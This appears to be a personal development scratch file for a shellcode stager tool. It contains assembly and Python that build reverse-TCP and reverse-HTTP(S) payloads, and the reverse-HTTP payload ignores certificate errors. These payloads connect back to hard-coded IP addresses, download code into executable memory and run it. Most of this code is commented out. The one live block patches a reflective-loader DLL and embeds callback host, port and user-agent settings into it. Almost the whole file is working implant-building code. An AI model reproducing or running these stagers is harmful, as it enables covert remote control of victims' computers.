


#---------Assembler--------
# from keystone import *

# code = b'''
#     mov eax, [esp]
#     push eax

#     mov ecx, 137
#     mov dl, 0DFh

# dec_code:
#     xor [esi], dl
#     inc esi
#     loop dec_code
#     jmp exit_main

# shellcode:
#     xor ebx, ebx
#     mov edi, fs:[30h]           
#     mov edi, [edi+0Ch]          
#     mov edi, [edi+1Ch]          

# exit_main:
#     add edi, [ebx+3Ah]
# '''
# var = "Hi World"

# ks = Ks(KS_ARCH_X86, KS_MODE_32)
# enc, cnt = ks.asm(code)
# print(enc)
# #-----------------------

# #------Disassembler------
# from capstone import *

# cs = Cs(CS_ARCH_X86, CS_MODE_32)
# # Append Data
# for n in var:
#     enc.append(ord(n))

# for n in cs.disasm(bytes(enc), 0):
#     print("0x%x:\t%s\t%s" % (n.address, n.mnemonic, n.op_str))
# #----------------------------


# from payload import Payloads

# p = Payloads()
# p.list()
# print(p.search_payload("shell"))
# print(p.get_payload("payloads/x86/stages/shell"))
# p.show_disasm("payloads/x86/stages/shell")

# from sys import stdout
# with open('/mnt/c/masm32/examples/test/backdoor/x86/reverse_http/others/payload_meterpreter.1', 'rb') as p:
#     d = p.read(0x400)
#     stdout.buffer.write(d)
#     stdout.buffer.flush()

# with open('/mnt/c/masm32/examples/test/backdoor/x86/reverse_http/others/ref_header.1', 'wb') as header:
#     header.write(d)


# import pefile
# # Load Dllinject.dll
# dll = pefile.PE("/mnt/c/masm32/examples/test/backdoor/x86/dllinject/dllinject.dll")
# exportdir = dll.DIRECTORY_ENTRY_EXPORT
# ref_loader_ofs = 0
# for n in exportdir.symbols:
#     if n.name == b"ReflectiveLoader":
#         ref_loader_ofs = dll.get_offset_from_rva(n.address)
#         print(hex(ref_loader_ofs))
#         break
# exit()


# import sys
# import time


# def strip_func_keys(cmd):
#     g = -1
#     pos = 0
#     fp = 0
#     n = 0
#     while True:
#         if ord(cmd[g+1]) < 0x20:
#             g = cmd[g+1:].find("~")
#             if g > 0:
#                 pos+=g
#                 g = pos
#                 n+=1
#                 fp = pos + n
#                 continue
#             else:
#                 break
#         else:
#             break

#     return fp


# while 1:
#     # g = sys.stdin.read()
#     sys.stdout.write("$ ShellStager> ")
#     s = sys.stdin
#     cmd = None
#     for l in s:
#         cmd = l.strip()
#         break
    
#     fp = strip_func_keys(cmd)            
#     print(cmd[fp:])
#     time.sleep(5)

# import sys
# import time

# def sanitize_input(g):
#     a = g.split("~")
#     cmd = ""
#     # find empty strings
#     # if found, the next element is part of it
#     found = False
#     for n in range(len(a)):
#         if a[n] == "":
#             found = True
#             continue
        
#         if found:
#             cmd = "{0}~{1}".format(cmd, a[n])
#     # this means, that the valid
#     # input is the last element
#     if cmd == "":
#         cmd = a[-1]

#     return cmd

# while 1:
#     # g = sys.stdin.read()
#     sys.stdout.write("$ ShellStager> ")
#     s = sys.stdin
#     cmd = None
#     for l in s:
#         cmd = l.strip()
#         break

#     if ord(cmd[0]) < 0x20:
#         print(sanitize_input(cmd))
#     else:
#         print(cmd)

#     time.sleep(5)



# print("[*] Patching DLLINJECT.DLL for HTTPS connection...")
# with open("/mnt/c/masm32/examples/test/backdoor/x86/dllinject/patched_dllinject.dll", "rb") as p:
#     d = p.read()

# # Search for 84680200h ;HTTP_OPEN_FLAGS
# # ;(0x80000000 | # INTERNET_FLAG_RELOAD
# # ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
# # ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
# # ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
# # ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
# # ; 0x00000200 ) # INTERNET_FLAG_NO_UI
# pos = -1
# pos = d.find(b"\x00\x02\x68\x84")
# if pos < 0:
#     print("No patching needed for HTTPS")
# else:
#     # Replace it with 84E83200h ;HTTP_OPEN_FLAGS
#     # ;(0x80000000 | # INTERNET_FLAG_RELOAD
#     # ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
#     # ; 0x00800000 | # INTERNET_FLAG_SECURE
#     # ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
#     # ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
#     # ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
#     # ; 0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
#     # ; 0x00001000 | # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
#     # ; 0x00000200 ) # INTERNET_FLAG_NO_UI
#     d = list(d)
#     d[pos] = 0
#     d[pos+1] = int("32", 16)
#     d[pos+2] = int("E8", 16)
#     d[pos+3] = int("84", 16)
#     with open("/home/jhyperv/pytools/shellstager/payloads/x86/stagers/reverse_https", "wb") as p:
#         p.write(bytes(d))
#         print("[*] Patched at offset 0x{0:08X}".format(pos))
# print("[*] Done.")


# with open("/mnt/c/masm32/examples/test/backdoor/x86/reverse_tcp/rtcp.exe", "rb") as rtcp:
#     d = rtcp.read(0x200)
#     print(''.join('\\x{:02x}'.format(x) for x in d))


# from keystone import *  # code assembler
# from capstone import *  # code disassembler
# import os

# def build_executable():
#         mzheader=b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00"
#         mzheader+=b"\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa8\x00\x00\x00"
#         mzheader+=b"\x0e\x1f\xba\x0e\x00\xb4\x09\xcd\x21\xb8\x01\x4c\xcd\x21\x54\x68"
#         mzheader+=b"\x69\x73\x20\x70\x72\x6f\x67\x72\x61\x6d\x20\x63\x61\x6e\x6e\x6f"
#         mzheader+=b"\x74\x20\x62\x65\x20\x72\x75\x6e\x20\x69\x6e\x20\x44\x4f\x53\x20"
#         mzheader+=b"\x6d\x6f\x64\x65\x2e\x0d\x0d\x0a\x24\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x5d\x17\x1d\xdb\x19\x76\x73\x88\x19\x76\x73\x88\x19\x76\x73\x88"
#         mzheader+=b"\xe5\x56\x61\x88\x18\x76\x73\x88\x52\x69\x63\x68\x19\x76\x73\x88"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x50\x45\x00\x00\x4c\x01\x01\x00"
#         mzheader+=b"\x63\x1a\x1f\x62\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x0f\x01"
#         mzheader+=b"\x0b\x01\x05\x0c\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x10\x00\x00\x00\x10\x00\x00\x00\x20\x00\x00\x00\x00\x40\x00"
#         mzheader+=b"\x00\x10\x00\x00\x00\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x02\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x10\x00\x00\x10\x00\x00"
#         mzheader+=b"\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x2e\x74\x65\x78\x74\x00\x00\x00\x60\x01\x00\x00\x00\x10\x00\x00"
#         mzheader+=b"\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x20\x00\x00\x60\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
#         mzheader+=b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

#         get_api=b'''
#                 cld
#                 call main_code                      
            
#                 pushad
#                 xor ebx, ebx
#                 mov ebp, esp
#                 mov ebx, fs:[30h]                   
#                 mov ebx, [ebx+0Ch]                      
#                 mov ebx, [ebx+14h]

#             next_module:
#                 movzx ecx, word ptr[ebx+26h]
#                 xor edi, edi
#                 mov esi, [ebx+28h]          

#             next_mod_char:
#                 xor eax, eax
#                 lodsb
#                 cmp al, 61h                 
#                 jl hash_upper
#                 sub al, 20h                 

#             hash_upper:
#                 ror edi, 0Dh
#                 add edi, eax
#                 loop next_mod_char
#                 push ebx
#                 push edi
#                 mov ebx, [ebx+10h]
#                 mov eax, [ebx+3Ch]
#                 add eax, ebx
#                 mov eax, [eax+78h]
#                 test eax, eax
#                 jz fetch_nxt_mod
#                 add eax, ebx
#                 push eax
#                 mov ecx, [eax+18h]
#                 mov edx, [eax+20h]
#                 add edx, ebx

#             next_api:
#                 test ecx, ecx
#                 jz fetch_nxt_mod2
#                 dec ecx
#                 mov esi, [edx+ecx*4]
#                 xor edi, edi
#                 add esi, ebx

#             next_api_char:    
#                 xor eax, eax
#                 lodsb
#                 ror edi, 0Dh
#                 add edi, eax
#                 cmp al, ah
#                 jnz next_api_char
#                 add edi, [ebp-8]
#                 cmp edi, [ebp+24h] 
#                 jnz next_api
#                 pop eax
#                 mov edx, [eax+24h]
#                 add edx, ebx
#                 mov cx, word ptr[edx+ecx*2]
#                 mov edx, [eax+1Ch]
#                 add edx, ebx
#                 mov edx, [edx+ecx*4]
#                 add edx, ebx                    
#                 mov eax, edx
#                 mov [esp+24h], eax
#                 pop edx
#                 pop edx
#                 popad
#                 pop ecx
#                 pop ebx
#                 push ecx
#                 jmp eax
#             fetch_nxt_mod2:
#                 pop eax

#             fetch_nxt_mod:
#                 pop edi
#                 pop ebx
#                 mov ebx, [ebx]
#                 jmp next_module

#             main_code:
#         '''
#         # Assemble
#         ks = Ks(KS_ARCH_X86, KS_MODE_32)
#         get_api_enc, cnt = ks.asm(get_api)
#         print(get_api_enc)
#         #-----------------------
#         rtcp=b'''
#                 pop ebp
#                 push 00003233h 
#                 push 5F327377h 
#                 push esp       
#                 push 0726774Ch 
#                 mov eax, ebp
#                 call eax       

#                 mov eax, 000000190h
#                 sub esp, eax
#                 push esp       
#                 push eax                        
#                 push 0006B8029h
#                 call ebp
#                 push 0Ah       

#             start_socket:
#                 push 0xAC1AE5A2
#                 push 5C110002h 
#                 mov esi, esp
#                 push eax
#                 push eax
#                 push eax
#                 push eax
#                 inc eax 
#                 push eax       
#                 inc eax        
#                 push eax       
#                 push 0E0DF0FEAh 
#                 call ebp
#                 xchg edi, eax

#             try_connect:
#                 push 10h       
#                 push esi       
#                 push edi       
#                 push 06174A599h
#                 call ebp
#                 test eax, eax
#                 jz start_recv
#                 dec dword ptr[esi+8]
#                 jnz try_connect

#             call_exit:
#                 call exit_code

#             start_recv:
#                 push 0              
#                 push 4              
#                 push esi            
#                 push edi            
#                 push 05FC8D902h     
#                 call ebp
#                 cmp eax, 0
#                 jle close_socket
#                 mov esi, [esi]
#                 push 40h           
#                 push 000001000h    
#                 push esi           
#                 push 0
#                 push 0E553A458h    
#                 call ebp
#                 xchg ebx, eax
#                 push ebx

#             recv_again:
#                 push 0                
#                 push esi        
#                 push ebx        
#                 push edi        
#                 push 05FC8D902h 
#                 call ebp
#                 cmp eax, 0
#                 jge recv_loop
#                 pop eax
#                 push 000004000h
#                 push 0
#                 push eax
#                 push 0300F2F0Bh  
#                 call ebp

#             close_socket:
#                 push edi
#                 push 0614D6E75h  
#                 call ebp
#                 pop esi
#                 pop esi
#                 dec dword ptr[esp]
#                 jnz start_socket
#                 jmp call_exit

#             recv_loop:
#                 add ebx, eax                    
#                 sub esi, eax        
#                 jnz recv_again
#                 ret                 

#             exit_code:
#                 mov ebx, 056A2B5F0h   
#                 push 0
#                 push ebx
#                 call ebp
#         '''
#         # Assemble
#         ks = Ks(KS_ARCH_X86, KS_MODE_32)
#         rtcp_enc, cnt = ks.asm(rtcp)
#         print(rtcp_enc)
#         #-----------------------

# build_executable()

# import struct
# import socket
# port=4444
# port_word = port.to_bytes((port.bit_length() + 7) // 8, 'little')
# host_be = struct.unpack("<I", socket.inet_aton("172.26.229.162"))[0]
# print("{0:04X}h".format(host_be))
# print("{0}0002h".format(port_word.hex()))


# ages = [24, 25, 20, 15, 17, 19, 13, 12]

# def fn(x):
#     if x < 18:
#         return False
#     else:
#         return True

# adults = filter(fn, ages)
# for n in adults:
#     print(n)

#-----------------------
# Remove Assembly Comments
# shell='''
#         pop ebp
#         push 000646D63h                     ;' dmc'
#         mov ebx,esp                                      
#         push edi
#         push edi
#         push edi
#         xor esi,esi
#         push 012h
#         pop ecx

#     set_esi:
#         push esi
#         loop set_esi
#         mov word ptr[esp+03Ch],0101h        ;
#         lea eax,[esp+010h]
#         mov byte ptr[eax],044h              ;size of SECURITY_ATTRIBUTES
#         push esp                            ;Pointer to PROCESS_INFORMATION
#         push eax                            ;Pointer to SECURITY_ATTRIBUTES
#         push esi
#         push esi
#         push esi
#         inc esi
#         push esi                            ;NEW_CONSOLE
#         dec esi
#         push esi
#         push esi
#         push ebx
#         push esi
#         push 0863FCC79h                     ;hash("kernel32.dll","CreateProcessA")
#         call ebp        
#         mov eax,esp
#         dec esi
#         push esi
#         inc esi
#         push dword ptr[eax]
#         push 0601D8708h                     ;hash("kernel32.dll", "WaitForSingleObjec")              
#         call ebp
#         mov ebx,056A2B5F0h                  ;hash("kernel32.dll", "ExitPropcess")
#         push 09DBD95A6h                     ;hash("kernel32.dll","GetVersiona")
#         call ebp
#         cmp al,6
#         jl exit_code
#         cmp bl,0E0h
#         jnz exit_code
#         mov ebx,06F721347h                  ;hash("ntdll.dll", "RtlExitUserThread")
    
#     exit_code:
#         push 0
#         push ebx
#         call ebp              
# '''
# shell = shell.split("\n")
# o = []
# for d in shell:
#     if len(d) <= 0:
#         continue
#     s = d.find(";")
#     if s < 0:
#         s=0
#         o.append(d[s:])
#     else:
#         o.append(d.replace(d[s:], ""))
# # Assemble
# shell = "\n".join(o)
# from keystone import *
# ks = Ks(KS_ARCH_X86, KS_MODE_32)
# shell_enc, cnt = ks.asm(shell)
#-----------------------

# sc="\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B"
# sc+="\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0"
# sc+="\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57"
# sc+="\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01"
# sc+="\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B"
# sc+="\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4"
# sc+="\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B"
# sc+="\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24"
# sc+="\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D"
# sc+="\x68\x63\x6D\x64\x00\x89\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56"
# sc+="\xE2\xFD\x66\xC7\x44\x24\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44"
# sc+="\x54\x50\x56\x56\x56\x46\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F"
# sc+="\x86\xFF\xD5\x89\xE0\x4E\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF"
# sc+="\xD5\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C"
# sc+="\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"

# from capstone import *
# sc = [ord(n) for n in sc]
# cs = Cs(CS_ARCH_X86, CS_MODE_32)
# for n in cs.disasm(bytes(sc), 0):
#     print("0x%x:\t%s\t%s" % (n.address, n.mnemonic, n.op_str))
#----------------------------


# sc = '''
#     call asm
#     db "Hi",0
# asm:
# '''
# from keystone import *
# ks = Ks(KS_ARCH_X86, KS_MODE_32)
# shell_enc, cnt = ks.asm(sc)
# print(shell_enc)



# from binascii import hexlify
# from capstone import *

# USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, \
#             like Gecko) Chrome/95.0.4638.69 Safari/537.36\0"
# URI_PATH = "/12345\0"
# HOST = "172.27.167.244\0"


# rhttp='''
#         pop ebp
#         push 00074656Eh                 ;" ten"
#         push 0696E6977h                 ;"iniw"
#         push esp
#         push 00726774Ch
#         call ebp                        ;hash("kernel32.dll", "LoadLibraryA")    
#         xor     edx, edx
#         push    edx
#         push    edx
#         push    edx
#         push    edx
#         push    edx
#         call    internetopen
#         ;<USER_AGENT_DISASM>

# internetopen:
#         push    0A779563Ah              ;hash("wininet.dll", "InternetOpenA")
#         call    ebp
#         push    edx
#         push    edx
#         push    3
#         push    edx
#         push    edx
#         push    {0:04X}h                ;port number
#         call    call_internetconnect
#         ;<URI_PATH_DISASM>
# internetconnect:
#         push    eax
#         push    0C69F8957h              ;hash("wininet.dll", "InternetConnect")
#         call    ebp
#         mov     esi, eax
#         push    edx
#         push    84680200h               ;HTTP_OPEN_FLAGS
#                                         ;(0x80000000 | # INTERNET_FLAG_RELOAD
#                                         ; 0x04000000 | # INTERNET_NO_CACHE_WRITE
#                                         ; 0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
#                                         ; 0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
#                                         ; 0x00080000 | # INTERNET_FLAG_NO_COOKIES
#                                         ; 0x00000200 ) # INTERNET_FLAG_NO_UI
#                                         ;84E83200h
#         push    edx
#         push    edx
#         push    edx
#         push    edi
#         push    edx
#         push    esi
#         push    3B2E55EBh               ;hash("wininet.dll", "HttpOpenRequestA")
#         call    ebp
#         xchg    eax, esi
#         push    0Ah                     ;number of connection attempts
#         pop     edi

#     httpsendrequest:
#         push    3380h                   ;(0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
#                                         ; 0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
#                                         ; 0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
#                                         ; 0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
#                                         ; 0x00000080 | # SECURITY_FLAG_IGNORE_REVOCATION)
#         mov     eax, esp
#         push    4
#         push    eax
#         push    1Fh                     ;INTERNET_OPTION_SECURITY_FLAGS
#         push    esi
#         push    869E4675h               ;hash("wininet.dll", "InternetSetOptionA")
#         call    ebp
#         push    edx
#         push    edx
#         push    edx
#         push    edx
#         push    esi
#         push    7B18062Dh               ;hash("wininet.dll", "HttpSendRequestA")
#         call    ebp
#         test    eax, eax
#         jnz     virtualalloc
#         push    1388h
#         push    0E035F044h              ;hash("kernel32.dll", "Sleep")
#         call    ebp
#         dec     edi
#         jnz     httpsendrequest

#     call_exit:
#         call    exit_code

#     virtualalloc:
#         push    40h ; '@'
#         push    1000h
#         push    400000h
#         push    edx
#         push    0E553A458h              ;hash("kernel32.dll", "VirtualAlloc")
#         call    ebp
#         xchg    eax, edx
#         push    edx
#         push    edx
#         mov     edi, esp

#     internetreadfile:
#         push    edx
#         push    edi
#         push    2000h
#         push    edx
#         push    esi
#         push    0E2899612h              ;hash("wininet.dll", "InternetReadFile")
#         call    ebp
#         pop     edx
#         test    eax, eax
#         jz      call_exit
#         mov     eax, [edi]
#         add     edx, eax
#         test    eax, eax
#         jnz     internetreadfile
#         pop     eax
#         ret
        
# call_internetconnect:
#         pop edi
#         call internetconnect
#         ;<HOST_ADDRESS_DISASM>

# exit_code:
#         mov edx, 056A2B5F0h             ;hash("kernel32.dll", "ExitProcess")
#         push 0
#         push edx
#         call ebp
# '''.format(8000)

# uagent = [ord(n) for n in USER_AGENT]
# asm = ""
# cs = Cs(CS_ARCH_X86, CS_MODE_32)
# for n in cs.disasm(bytes(uagent), 0):
#     asm += "    %s %s \n" % (n.mnemonic, n.op_str)
# rhttp = rhttp.replace(";<USER_AGENT_DISASM>", asm)

# uripath = hexlify(bytes(URI_PATH.encode("utf-8")))
# asm = ""
# cs = Cs(CS_ARCH_X86, CS_MODE_32)
# for n in cs.disasm(bytes(uripath), 0):
#     asm += "    %s %s \n" % (n.mnemonic, n.op_str)
# rhttp = rhttp.replace(";<URI_PATH_DISASM>", asm)

# hostaddr = hexlify(bytes(URI_PATH.encode("utf-8")))
# asm = ""
# cs = Cs(CS_ARCH_X86, CS_MODE_32)
# for n in cs.disasm(bytes(hostaddr), 0):
#     asm += "    %s %s \n" % (n.mnemonic, n.op_str)
# rhttp = rhttp.replace(";<HOST_ADDRESS_DISASM>", asm)

# rhttp = rhttp.split("\n")
# o = []
# for d in rhttp:
#     if len(d) <= 0:
#         continue
#     s = d.find(";")
#     if s < 0:
#         s=0
#         o.append(d[s:])
#     else:
#         o.append(d.replace(d[s:], ""))
# # Assemble
# rhttp = "\n".join(o)
# from keystone import *
# ks = Ks(KS_ARCH_X86, KS_MODE_32)
# shell_enc, cnt = ks.asm(rhttp)
# print(shell_enc)



# x = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30]
# print(x)
# print(len(x))
# g = [ord(n) for n in "dlareg"]
# x[10:10+len(g)] = g
# print(x)
# print(len(x))


import pefile
dllfile = "payloads/binaries/dllreflectiveloader.dll"
# Get FileOffset of ReflectiveLoader function address
dll = pefile.PE(dllfile)
exportdir = dll.DIRECTORY_ENTRY_EXPORT
ref_loader_ofs = 0
bexport = False
for n in exportdir.symbols:
    if n.name == b"ReflectiveLoader":
        ref_loader_ofs = dll.get_offset_from_rva(n.address)
        bexport = True
        break

if not bexport:
    exit()

# Patch Initial MZ Header with Reflective Loader code
dll.DOS_HEADER.e_magic = 0x5A4D
dll.DOS_HEADER.e_cblp = 0x00E8
dll.DOS_HEADER.e_cp = 0
dll.DOS_HEADER.e_crlc = 0x5B00
dll.DOS_HEADER.e_cparhdr = 0x4552
dll.DOS_HEADER.e_minalloc = 0x8955
dll.DOS_HEADER.e_maxalloc = 0x81E5
dll.DOS_HEADER.e_ss = 0x30C3
dll.DOS_HEADER.e_sp = 0x0004
dll.DOS_HEADER.e_csum = 0xFF00
dll.DOS_HEADER.e_ip = 0x81D3
dll.DOS_HEADER.e_cs = 0x00C3
dll.DOS_HEADER.e_lfarlc = 0x000C
dll.DOS_HEADER.e_ovno = 0x8900
dll.DOS_HEADER.e_res = b";Sj\x17P\xff\xd0\x00"

# Write dll to buffer
asm = dll.write()
# Patch Offset 0x0Fh at MZHeader 
# with actual FileOffset of ReflectiveLoader Procedure
import struct
l = struct.pack("<I", (ref_loader_ofs-7))
asm[0x0F:0x0F+4] = l
# Patch Offset 0x17h at MZHeader 
# with FileOffset pointing to End of Dll
EODLL = 0
for s in dll.sections:
    EODLL = s.PointerToRawData
    EODLL += s.SizeOfRawData
l = struct.pack("<I", (EODLL-ref_loader_ofs))
asm[0x17:0x17+4] = l
# insert Config here
asm += bytes([0,0,0,0])
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
HOST = "172.27.45.52"
import struct
PORT = 8000
asm += bytes([0,0,0,0])
asm += bytes([len(USER_AGENT)+1] + [ord(n) for n in USER_AGENT] + [0])
asm += bytes([len("POST")+1] + [ord(n) for n in "POST"] + [0])
asm += bytes([len(HOST)+1] + [ord(n) for n in HOST] + [0])
asm += struct.pack("<h", PORT)

with open("payloads/binaries/patch_dllreflectiveloader_hehe.dll", "wb") as rlhttp:
    rlhttp.write(asm)

# import os
# dllname = "patch_dllreflectiveloader.dll"
# dllname = "{0}_{1}.{2}".format(os.path.splitext(dllname)[0], "http", os.path.splitext(dllname)[1])
# print(dllname)



